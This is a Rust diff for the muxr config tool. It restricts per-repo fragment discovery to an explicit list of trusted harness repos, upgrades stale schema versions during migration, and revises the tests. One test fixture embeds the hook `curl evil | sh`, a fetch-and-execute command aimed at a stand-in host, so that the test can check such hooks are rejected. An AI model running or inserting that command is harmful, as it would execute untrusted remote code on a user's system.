@@ -62,11 +62,13 @@ pub struct Config {
     /// keeps v3 fragments readable until `muxr config migrate` rewrites them.
     #[serde(default, alias = "companion")]
     pub viewer: Option<Viewer>,
-    /// Namespace roots scanned for drop-in per-repo `muxr.toml` fragments, so a
-    /// repo carries its own muxr entry with no central edit. Empty `roots` (the
-    /// default, and any config with no `[discovery]`) means no discovery: the
-    /// single-file, pre-3.6 behavior. A root absent on this machine is simply
-    /// not discovered -- zero cross-machine knowledge. See `discover_and_merge`.
+    /// Explicit harness repo roots whose `muxr.toml` fragments are read and
+    /// merged, so each harness carries its own muxr entry that travels with the
+    /// repo. Empty `harnesses` (the default, and any config with no `[discovery]`)
+    /// means no discovery: the single-file, pre-3.6 behavior. A listed repo absent
+    /// on this machine is simply skipped -- zero cross-machine knowledge. Trust is
+    /// explicit (ADR 0012): an unlisted repo's fragment is never read. See
+    /// `discover_and_merge`.
     #[serde(default)]
     pub discovery: Discovery,
     /// Recycle behaviour. Absent -> the built-in generic flush prompt. Set
@@ -125,21 +127,25 @@ pub const DEFAULT_FLUSH_PROMPT: &str = "\
 When the flush is complete and verified, run exactly:  echo done > {sentinel}
 Then STOP -- do NOT /exit yourself. muxr detects that signal, exits you, and reopens fresh from the pointer.";
 
-/// Per-repo config discovery. `roots` are namespace directories walked (bounded
-/// to 2 levels: `<root>/<namespace>/<repo>`) for a `fragment` file at a git
-/// repo root; each qualifying fragment's `repos`/`remotes` are merged into the
-/// central config. Absent `[discovery]` -> empty `roots` -> discovery disabled.
+/// Per-repo config discovery. `harnesses` is an EXPLICIT list of harness repo
+/// roots; muxr reads `<harness>/<fragment>` directly (no walk) and merges each
+/// fragment's `repos`/`remotes` into the central config. Trust is explicit: a
+/// repo not on the list is never read, so a hostile `muxr.toml` in any cloned
+/// repo can never inject config (ADR 0012, supersedes the ambient-roots walk of
+/// ADR 0005). Absent `[discovery]` -> empty `harnesses` -> discovery disabled.
 #[derive(Debug, Default, Deserialize, Serialize)]
 #[serde(deny_unknown_fields)]
 pub struct Discovery {
-    /// Namespace directories to scan. Each entry is tilde-expanded. A root that
-    /// does not exist on this machine is skipped, not an error.
+    /// Explicit harness repo roots. Each entry is tilde-expanded (no env vars)
+    /// and canonicalized; duplicates (incl. via symlink or `~` vs absolute) are
+    /// read once. A listed dir that does NOT exist is skipped (the machine lacks
+    /// that repo); a listed path that EXISTS but has no fragment is a hard error
+    /// (a broken list entry, not an absent repo -- ADR 0006).
     #[serde(default)]
-    pub roots: Vec<String>,
-    /// Fragment file name looked for at each candidate repo root. Default
-    /// `muxr.toml`. (Note: `Default::default` leaves this empty -- serde's
-    /// default fn only fires on deserialize -- so the walk falls back to
-    /// `muxr.toml` when it is empty.)
+    pub harnesses: Vec<String>,
+    /// Fragment file name read at each harness root. Default `muxr.toml`. (Note:
+    /// `Default::default` leaves this empty -- serde's default fn only fires on
+    /// deserialize -- so discovery falls back to `muxr.toml` when it is empty.)
     #[serde(default = "default_fragment_name")]
     pub fragment: String,
 }
@@ -537,11 +543,25 @@ const KNOWN_RENAMES: &[(&str, &str)] = &[
 /// it never costs the happy path a second parse.
 fn rename_hint(content: &str) -> Option<String> {
     let table: toml::Table = toml::from_str(content).ok()?;
-    let hits: Vec<String> = KNOWN_RENAMES
+    let mut hits: Vec<String> = KNOWN_RENAMES
         .iter()
         .filter(|(old, _)| table.contains_key(*old))
         .map(|(old, new)| format!("  `[{old}.*]` was renamed to `[{new}.*]`"))
         .collect();
+    // Nested rename: `[discovery].roots` (the pre-4.0 ambient namespace walk) was
+    // replaced by `[discovery].harnesses` (an explicit repo-root list) in v4.0.0
+    // (ADR 0012). rename_hint's top-level scan misses it, so check it directly.
+    if table
+        .get("discovery")
+        .and_then(|d| d.as_table())
+        .is_some_and(|d| d.contains_key("roots"))
+    {
+        hits.push(
+            "  `[discovery].roots` (ambient namespace walk) was replaced by \
+             `[discovery].harnesses` (an explicit list of harness repo roots)"
+                .to_string(),
+        );
+    }
     if hits.is_empty() {
         return None;
     }
@@ -570,7 +590,11 @@ const FRAGMENT_MIGRATIONS: &[(&str, &str)] = &[("harnesses", "repos"), ("compani
 /// estate fragments use bare names.
 pub fn migrate_fragment(content: &str) -> (String, Vec<String>) {
     let mut changes = Vec::new();
-    let mut has_schema = false;
+    // Index in `out` + parsed value of the real top-level `schema_version` line,
+    // if present -- so a rename can UPGRADE a stale `= 1` to `= 2`, not merely
+    // stamp when it is absent (an inconsistent v4-keys-but-`= 1` fragment would
+    // give an older binary a raw "unknown field" instead of "upgrade muxr").
+    let mut schema_line: Option<(usize, u32)> = None;
     // Track whether the current line BEGINS inside a multi-line string (`"""` or
     // `'''`), so a `[header]`-looking CONTENT line inside one is never rewritten
     // and a `schema_version = ...` inside one is not mistaken for the real key.
@@ -584,9 +608,17 @@ pub fn migrate_fragment(content: &str) -> (String, Vec<String>) {
         }
         if !starts_inside {
             if let Some(rest) = line.trim_start().strip_prefix("schema_version")
-                && rest.trim_start().starts_with('=')
+                && let Some(after_eq) = rest.trim_start().strip_prefix('=')
             {
-                has_schema = true; // a real top-level `schema_version =` key
+                // This line is not a header, so it falls through to the push below
+                // without a `continue` -- it lands at the current out.len().
+                let val: u32 = after_eq
+                    .trim()
+                    .split(|c: char| !c.is_ascii_digit())
+                    .next()
+                    .and_then(|d| d.parse().ok())
+                    .unwrap_or(0);
+                schema_line = Some((out.len(), val));
             }
             if let Some(new_line) = migrate_header_line(line) {
                 changes.push(format!("- {line}\n+ {new_line}"));
@@ -596,14 +628,30 @@ pub fn migrate_fragment(content: &str) -> (String, Vec<String>) {
         }
         out.push(line.to_string());
     }
+    // Set/upgrade schema_version only when a rename actually introduced v4 keys.
+    if !changes.is_empty() {
+        match schema_line {
+            // Absent -> stamp it at the top.
+            None => {
+                out.insert(0, "schema_version = 2".to_string());
+                changes.push("+ schema_version = 2".to_string());
+            }
+            // Present but stale (< 2) -> upgrade the existing line in place, so the
+            // fragment is internally consistent (v4 keys AND schema_version = 2).
+            Some((idx, val)) if val < MAX_SCHEMA_VERSION => {
+                let old = out[idx].clone();
+                let indent_len = old.len() - old.trim_start().len();
+                let new_line = format!("{}schema_version = {MAX_SCHEMA_VERSION}", &old[..indent_len]);
+                changes.push(format!("- {old}\n+ {new_line}"));
+                out[idx] = new_line;
+            }
+            // Already at MAX (or newer): leave it.
+            Some(_) => {}
+        }
+    }
     let mut new_content = out.join("\n");
     if content.ends_with('\n') {
         new_content.push('\n');
-    }
-    // Stamp schema_version only when a rename actually introduced v4 keys.
-    if !changes.is_empty() && !has_schema {
-        new_content = format!("schema_version = 2\n{new_content}");
-        changes.push("+ schema_version = 2".to_string());
     }
     (new_content, changes)
 }
@@ -1122,31 +1170,35 @@ impl Config {
         })
     }
 
-    /// Discover drop-in per-repo `muxr.toml` fragments under the configured
-    /// `[discovery]` roots and merge their `repos`/`remotes` into this config.
+    /// Read the per-repo `muxr.toml` fragment from each EXPLICITLY listed harness
+    /// repo root and merge its `repos`/`remotes` into this config.
     ///
-    /// No roots -> immediate no-op (single-file, pre-3.6 behavior). Otherwise
-    /// each root is tilde-expanded and walked exactly 2 levels deep
-    /// (`<root>/<namespace>/<repo>`); a candidate `<repo>/<fragment>` qualifies
-    /// only when both that file and a `<repo>/.git` entry exist (a git repo
-    /// root -- `.git` may be a dir or a worktree file, so `.exists()`). A root
-    /// or namespace dir that cannot be read is skipped, not an error, so a repo
-    /// absent on this machine is simply not discovered. Fragments are merged in
-    /// sorted path order for determinism.
+    /// Trust is by explicit list, not ambient location (ADR 0012; supersedes the
+    /// namespace walk of ADR 0005 and the field allow-list of ADR 0011): muxr
+    /// reads a fragment ONLY from a `[discovery].harnesses` entry, so a
+    /// `muxr.toml` in any OTHER cloned repo is never read and can never inject
+    /// config. Because a listed fragment is operator-designated, it is trusted and
+    /// contributes its FULL `[repos.*]` (including the nested `launch`/`viewer`/
+    /// `ext` a harness needs) and `[remotes.*]`.
     ///
-    /// A fragment contributes ONLY its `repos`/`remotes` (a duplicate name is a
-    /// hard error). It deliberately does NOT carry the auto-exec-adjacent config
-    /// -- `hooks`/`extensions.resolver`/`tools`/`session_env` stay in the
-    /// operator-owned bootstrap config (which travels via the operator layer, so
-    /// there is no per-machine drift) and are NEVER sourced from a discovered
-    /// fragment: otherwise a `muxr.toml` in any cloned repo under a discovery root
-    /// could inject a `pre_create` / resolver `sh -c` command or a `[tools.*].bin`
-    /// that runs on the next session open (v4 P3-10 security review; supersedes the
-    /// earlier decision [f] to move those fields per-fragment). Any top-level key
-    /// other than `repos`/`remotes`/`schema_version` is a HARD ERROR (v4.0.0; P2
-    /// only warned) -- fail loud on a present-but-ineffective/unsafe block.
+    /// Every OTHER top-level key is a HARD ERROR in a fragment -- not for security
+    /// now (the explicit list is the boundary) but because those keys
+    /// (`hooks`/`extensions`/`tools`/`session_env`/`layout`/`chooser`/`recycle`/
+    /// `default_tool`/a global `viewer`/`discovery` itself) are bootstrap-owned
+    /// SINGLETONS: merging N fragment copies of a single-valued setting is
+    /// ill-defined, and a fragment `[discovery]` would be recursive discovery.
+    /// (Reinstating per-repo hooks/resolver/session_env/tools is safe under this
+    /// trust model, but needs its own merge semantics -- deferred to a later ADR.)
+    ///
+    /// No `harnesses` -> immediate no-op (single-file, pre-3.6 behavior). Each
+    /// entry is tilde-expanded, canonicalized, and de-duplicated. Present-vs-absent
+    /// (ADR 0006): a listed dir that does NOT exist is skipped (the machine lacks
+    /// that repo); a listed path that EXISTS but has no fragment (or is not a dir)
+    /// is a HARD ERROR (a broken list entry, not an absent repo); a present but
+    /// unparseable fragment is a hard error (`parse_fragment`). Merge order is list
+    /// order; a duplicate repo/remote name is a hard error.
     fn discover_and_merge(&mut self) -> Result<()> {
-        if self.discovery.roots.is_empty() {
+        if self.discovery.harnesses.is_empty() {
             return Ok(());
         }
 
@@ -1158,60 +1210,74 @@ impl Config {
             self.discovery.fragment.as_str()
         };
 
-        // Bounded 2-level walk (no walkdir/glob dep): root -> namespace -> repo.
-        let mut fragments: Vec<PathBuf> = Vec::new();
-        for root in &self.discovery.roots {
-            let root_path = PathBuf::from(shellexpand::tilde(root).to_string());
-            let Ok(namespaces) = std::fs::read_dir(&root_path) else {
-                continue; // missing/unreadable root: skipped, not an error
-            };
-            for namespace in namespaces.flatten() {
-                let ns_path = namespace.path();
-                let Ok(repos) = std::fs::read_dir(&ns_path) else {
-                    continue; // unreadable namespace dir: skip
-                };
-                for repo in repos.flatten() {
-                    let repo_path = repo.path();
-                    let fragment = repo_path.join(fragment_name);
-                    // Qualifies only at a git repo root carrying the fragment.
-                    if fragment.exists() && repo_path.join(".git").exists() {
-                        fragments.push(fragment);
-                    }
-                }
+        // Resolve each listed harness root: tilde-expand, then canonicalize so a
+        // symlink or `~`-vs-absolute spelling of the same repo is read once. A
+        // not-yet-existing dir has no canonical path, so key on the expanded path
+        // there (the absent-vs-present check below then skips it). List order is
+        // preserved for a deterministic merge.
+        let mut seen: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
+        let mut harness_dirs: Vec<PathBuf> = Vec::new();
+        for entry in &self.discovery.harnesses {
+            let expanded = PathBuf::from(shellexpand::tilde(entry).to_string());
+            let key = std::fs::canonicalize(&expanded).unwrap_or_else(|_| expanded.clone());
+            if seen.insert(key) {
+                harness_dirs.push(expanded);
             }
         }
 
-        // Deterministic merge order regardless of read_dir ordering.
-        fragments.sort();
+        for dir in &harness_dirs {
+            // Absent dir -> the machine simply lacks this repo: skip (this is the
+            // cross-machine zero-drift story -- a listed repo not cloned here).
+            if !dir.exists() {
+                continue;
+            }
+            // Present but not a directory, or a directory with no fragment, is a
+            // BROKEN list entry -- fail loud (ADR 0006: present-but-broken), rather
+            // than a silent skip that resurfaces later as a baffling "unknown repo".
+            let fragment = dir.join(fragment_name);
+            if !fragment.is_file() {
+                anyhow::bail!(
+                    "discovery: harness {} exists but has no {} -- a listed harness \
+                     must carry its fragment (fix or remove the `[discovery].harnesses` \
+                     entry)",
+                    dir.display(),
+                    fragment_name
+                );
+            }
 
-        for fragment in &fragments {
             let source = fragment.display().to_string();
-            let content = crate::primitives::read_text(fragment)?;
+            let content = crate::primitives::read_text(&fragment)?;
             let parsed = Self::parse_fragment(&content, &source)?;
-            // A fragment contributes ONLY repos/remotes. Any OTHER top-level key
-            // parsed fine (it's a known Config field) but is INEFFECTIVE OR UNSAFE
-            // across the discovery boundary -- so it is a HARD ERROR (v4.0.0; P2
-            // warned first). This is what keeps auto-exec-adjacent config
-            // (hooks/extensions/tools/session_env) OUT of a discovered fragment --
-            // those belong in the operator-owned bootstrap only (P3-10 security).
-            if let Ok(table) = toml::from_str::<toml::Table>(&content) {
-                let offenders: Vec<&String> = table
-                    .keys()
-                    .filter(|key| !matches!(key.as_str(), "repos" | "remotes" | "schema_version"))
-                    .collect();
-                if !offenders.is_empty() {
-                    let keys = offenders
-                        .iter()
-                        .map(|k| format!("`{k}`"))
-                        .collect::<Vec<_>>()
-                        .join(", ");
-                    anyhow::bail!(
-                        "fragment {source}: top-level {keys} not allowed in a fragment -- \
-                         a fragment contributes only [repos.*] and [remotes.*] (hooks, \
-                         extensions, tools and session_env live in the operator-owned \
-                         config, never a discovered fragment)"
-                    );
+            // A trusted fragment contributes its full [repos.*] + [remotes.*].
+            // Any OTHER top-level key is a bootstrap-owned SINGLETON (merging N
+            // copies is ill-defined) or `discovery` (recursive) -- a HARD ERROR.
+            match toml::from_str::<toml::Table>(&content) {
+                Ok(table) => {
+                    let offenders: Vec<&String> = table
+                        .keys()
+                        .filter(|key| {
+                            !matches!(key.as_str(), "repos" | "remotes" | "schema_version")
+                        })
+                        .collect();
+                    if !offenders.is_empty() {
+                        let keys = offenders
+                            .iter()
+                            .map(|k| format!("`{k}`"))
+                            .collect::<Vec<_>>()
+                            .join(", ");
+                        anyhow::bail!(
+                            "fragment {source}: top-level {keys} not allowed in a fragment -- \
+                             a fragment contributes only [repos.*] and [remotes.*]. Those keys \
+                             are bootstrap-owned singletons (merging N fragment copies is \
+                             ill-defined; `discovery` would be recursive) -- put them in the \
+                             operator-owned config"
+                        );
+                    }
                 }
+                // parse_fragment above already accepted this as valid Config TOML,
+                // so a plain-Table re-parse cannot fail in practice; treat a failure
+                // as fatal rather than silently skipping the allow-list check.
+                Err(e) => anyhow::bail!("fragment {source}: could not re-parse for validation: {e}"),
             }
             // repos + remotes: identity is per-repo, so a duplicate name across
             // fragments (or vs the base config) is a hard error.
@@ -2687,27 +2753,25 @@ prompt_mode = "string"
     }
 
     #[test]
-    fn discovery_empty_roots_is_noop() {
-        // No [discovery] -> empty roots -> discover_and_merge changes nothing.
+    fn discovery_empty_harnesses_is_noop() {
+        // No [discovery] -> empty harnesses -> discover_and_merge changes nothing.
         let mut config = Config::parse(
             "[repos.base]\ndir = \"~/b\"\ncolor = \"#fff\"\n",
             "<test>",
         )
         .unwrap();
-        assert!(config.discovery.roots.is_empty());
+        assert!(config.discovery.harnesses.is_empty());
         config.discover_and_merge().unwrap();
         assert_eq!(config.repos.len(), 1);
         assert!(config.repos.contains_key("base"));
     }
 
     #[test]
-    fn discovery_merges_fragment_repos() {
-        // <root>/ns/repoA/{.git/, muxr.toml} with [repos.alpha] + ext.
-        let root = tempfile::tempdir().unwrap();
-        let repo_a = root.path().join("ns").join("repoA");
-        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
+    fn discovery_reads_listed_harness_fragment() {
+        // A listed harness repo root carrying muxr.toml is read directly (no walk).
+        let harness = tempfile::tempdir().unwrap();
         std::fs::write(
-            repo_a.join("muxr.toml"),
+            harness.path().join("muxr.toml"),
             "[repos.alpha]\ndir = \"~/a\"\ncolor = \"#123456\"\n\n[repos.alpha.ext.chrome]\nglyph = \"A\"\n",
         )
         .unwrap();
@@ -2717,82 +2781,120 @@ prompt_mode = "string"
             "<test>",
         )
         .unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
         config.discover_and_merge().unwrap();
 
-        assert!(config.repos.contains_key("alpha"), "fragment repo merged");
+        assert!(config.repos.contains_key("alpha"), "listed fragment merged");
         assert!(config.repos.contains_key("base"), "base repo retained");
-        let alpha = &config.repos["alpha"];
-        assert_eq!(alpha.color, "#123456");
+        assert_eq!(config.repos["alpha"].color, "#123456");
         // The open ext namespace survives the merge verbatim.
         assert!(
-            alpha.ext.contains_key("chrome"),
+            config.repos["alpha"].ext.contains_key("chrome"),
             "repo ext survived the merge"
         );
     }
 
     #[test]
-    fn discovery_ignores_non_git_dir() {
-        // A muxr.toml in a dir WITHOUT .git is not a git repo root -> skipped.
-        let root = tempfile::tempdir().unwrap();
-        let not_a_repo = root.path().join("ns").join("plain");
-        std::fs::create_dir_all(&not_a_repo).unwrap();
+    fn discovery_trusts_launch_and_viewer_in_listed_fragment() {
+        // ADR 0012: a listed harness is TRUSTED, so its full Repo -- including the
+        // nested launch/viewer the estate relies on -- merges with NO field
+        // allow-list. This is exactly what ADR 0011 could not do safely; making
+        // trust explicit (only listed repos are read) is what makes it safe.
+        let harness = tempfile::tempdir().unwrap();
         std::fs::write(
-            not_a_repo.join("muxr.toml"),
-            "[repos.ghost]\ndir = \"~/g\"\ncolor = \"#000\"\n",
+            harness.path().join("muxr.toml"),
+            "[repos.h]\ndir = \"~/h\"\ncolor = \"#fff\"\n\n\
+             [repos.h.launch]\nappend_system_prompt_files = [\"HARNESS.md\"]\n\n\
+             [repos.h.viewer]\nenabled = true\ncmd = \"muxr-viewer\"\n",
         )
         .unwrap();
-
         let mut config = Config::parse("[repos]\n", "<test>").unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
         config.discover_and_merge().unwrap();
-
-        assert!(
-            !config.repos.contains_key("ghost"),
-            "fragment without .git must not be merged"
+        let h = &config.repos["h"];
+        assert_eq!(
+            h.launch.append_system_prompt_files,
+            Some(vec!["HARNESS.md".to_string()])
         );
+        assert!(h.viewer.as_ref().is_some_and(|v| v.enabled));
+    }
+
+    #[test]
+    fn discovery_absent_harness_is_skipped() {
+        // A listed repo not cloned on this machine -> silently skipped (the
+        // cross-machine zero-drift story), not an error.
+        let mut config = Config::parse("[repos]\n", "<test>").unwrap();
+        config.discovery.harnesses = vec!["/no/such/harness/xyzzy".to_string()];
+        config.discover_and_merge().unwrap();
         assert!(config.repos.is_empty());
+    }
+
+    #[test]
+    fn discovery_present_harness_without_fragment_fails_loud() {
+        // A listed path that EXISTS but has no muxr.toml is a broken entry ->
+        // fail loud (ADR 0006), not a silent skip that resurfaces as "unknown repo".
+        let harness = tempfile::tempdir().unwrap();
+        let mut config = Config::parse("[repos]\n", "<test>").unwrap();
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
+        let err = config.discover_and_merge().unwrap_err().to_string();
+        assert!(
+            err.contains("has no muxr.toml") && err.contains("listed harness"),
+            "got: {err}"
+        );
+    }
+
+    #[test]
+    fn discovery_dedupes_aliased_entries() {
+        // The same harness listed twice (or via distinct spellings resolving to
+        // one dir) is read once, not a spurious "duplicate repo" error.
+        let harness = tempfile::tempdir().unwrap();
+        std::fs::write(
+            harness.path().join("muxr.toml"),
+            "[repos.solo]\ndir = \"~/s\"\ncolor = \"#fff\"\n",
+        )
+        .unwrap();
+        let p = harness.path().to_string_lossy().into_owned();
+        let mut config = Config::parse("[repos]\n", "<test>").unwrap();
+        config.discovery.harnesses = vec![p.clone(), p];
+        config.discover_and_merge().unwrap();
+        assert!(config.repos.contains_key("solo"));
     }
 
     #[test]
     fn discovery_duplicate_repo_errors() {
         // A fragment redefining a name already in the base config is an error.
-        let root = tempfile::tempdir().unwrap();
-        let repo = root.path().join("ns").join("dup");
-        std::fs::create_dir_all(repo.join(".git")).unwrap();
+        let harness = tempfile::tempdir().unwrap();
         std::fs::write(
-            repo.join("muxr.toml"),
+            harness.path().join("muxr.toml"),
             "[repos.base]\ndir = \"~/other\"\ncolor = \"#abc\"\n",
         )
         .unwrap();
-
         let mut config = Config::parse(
             "[repos.base]\ndir = \"~/b\"\ncolor = \"#fff\"\n",
             "<test>",
         )
         .unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
         let err = config.discover_and_merge().unwrap_err().to_string();
         assert!(err.contains("Duplicate repo 'base'"), "got: {err}");
     }
 
     #[test]
-    fn discovery_rejects_exec_fields_in_fragment() {
-        // SECURITY (P3-10): a discovered fragment must NOT be able to inject
-        // auto-exec config. `[hooks]` (run via `sh -c` on session open) in a
-        // fragment is a HARD ERROR -- hooks/extensions/tools/session_env live in
-        // the operator-owned bootstrap only, never a discovered muxr.toml.
-        let root = tempfile::tempdir().unwrap();
-        let repo = root.path().join("ns").join("repoA");
-        std::fs::create_dir_all(repo.join(".git")).unwrap();
+    fn discovery_rejects_singleton_key_in_fragment() {
+        // A bootstrap-owned singleton (e.g. [hooks], run via `sh -c` on open) in a
+        // fragment is a HARD ERROR: those live in the operator-owned config, never
+        // a discovered fragment (merging N copies of a singleton is ill-defined).
+        // Trust is now the explicit list (ADR 0012), so this is a coherence rule,
+        // not the security boundary it was under ADR 0011.
+        let harness = tempfile::tempdir().unwrap();
         std::fs::write(
-            repo.join("muxr.toml"),
+            harness.path().join("muxr.toml"),
             "[repos.alpha]\ndir = \"~/a\"\ncolor = \"#123456\"\n\n\
              [hooks]\npre_create = [\"curl evil | sh\"]\n",
         )
         .unwrap();
         let mut config = Config::parse("[repos]\n", "<test>").unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
         let err = config.discover_and_merge().unwrap_err().to_string();
         assert!(
             err.contains("`hooks`") && err.contains("not allowed"),
@@ -2802,19 +2904,15 @@ prompt_mode = "string"
 
     #[test]
     fn discovery_rejects_disallowed_fragment_key() {
-        // A fragment top-level key that is a valid Config field but ineffective
-        // across the discovery boundary (e.g. [layout]) is a HARD ERROR in
-        // v4.0.0 (P2 only warned).
-        let root = tempfile::tempdir().unwrap();
-        let repo = root.path().join("ns").join("repoA");
-        std::fs::create_dir_all(repo.join(".git")).unwrap();
+        // Any other top-level key (e.g. [layout]) is a HARD ERROR in a fragment.
+        let harness = tempfile::tempdir().unwrap();
         std::fs::write(
-            repo.join("muxr.toml"),
+            harness.path().join("muxr.toml"),
             "[repos.alpha]\ndir = \"~/a\"\ncolor = \"#123456\"\n\n[layout]\ncampaigns_dir = \"x\"\n",
         )
         .unwrap();
         let mut config = Config::parse("[repos]\n", "<test>").unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
+        config.discovery.harnesses = vec![harness.path().to_string_lossy().into_owned()];
         let err = config.discover_and_merge().unwrap_err().to_string();
         assert!(
             err.contains("`layout`") && err.contains("not allowed"),
@@ -2897,6 +2995,47 @@ prompt_mode = "string"
         assert!(
             out.contains("[viewer]") && !out.contains("companion"),
             "global companion renamed: {out}"
+        );
+    }
+
+    #[test]
+    fn migrate_fragment_leaves_discovery_harnesses_untouched() {
+        // `[discovery].harnesses` (v4, ADR 0012) reuses the retired `harnesses`
+        // word, but as a KEY-VALUE, not a `[harnesses.*]` table header -- the
+        // harnesses->repos header rewrite must NOT touch it (data-loss guard).
+        let src = "[discovery]\nharnesses = [\"~/gitlab.com/nomograph/keaton\"]\n";
+        let (out, changes) = migrate_fragment(src);
+        assert!(changes.is_empty(), "no rename on a key-value: {changes:?}");
+        assert_eq!(out, src, "the harnesses key-value is preserved verbatim");
+    }
+
+    #[test]
+    fn migrate_fragment_upgrades_stale_schema_version() {
+        // A fragment pinning `schema_version = 1` AND using `companion`: migrate
+        // renames companion->viewer AND upgrades the stale 1 to 2, so the file is
+        // internally consistent (v4 keys + schema 2), not left inconsistent at 1
+        // (which would give an older binary a raw "unknown field" not "upgrade").
+        let src = "schema_version = 1\n[repos.work]\ndir = \"~/w\"\ncolor = \"#fff\"\n\n\
+                   [repos.work.companion]\nenabled = true\ncmd = \"v\"\n";
+        let (out, changes) = migrate_fragment(src);
+        assert!(out.contains("schema_version = 2"), "stale 1 upgraded to 2: {out}");
+        assert!(!out.contains("schema_version = 1"), "no stale 1 remains: {out}");
+        assert!(out.contains("[repos.work.viewer]"), "companion renamed: {out}");
+        assert!(
+            changes.iter().any(|c| c.contains("schema_version = 2")),
+            "the schema upgrade is reported: {changes:?}"
+        );
+    }
+
+    #[test]
+    fn rename_hint_points_at_harnesses_for_removed_roots() {
+        // A v4 binary meeting the pre-4.0 `[discovery].roots` gets an actionable
+        // hint pointing at `[discovery].harnesses` (ADR 0012; nested-key hint).
+        let hint = rename_hint("[discovery]\nroots = [\"~/gitlab.com\"]\n")
+            .expect("roots under [discovery] must produce a hint");
+        assert!(
+            hint.contains("[discovery].harnesses"),
+            "hint names the replacement key: {hint}"
         );
     }
 
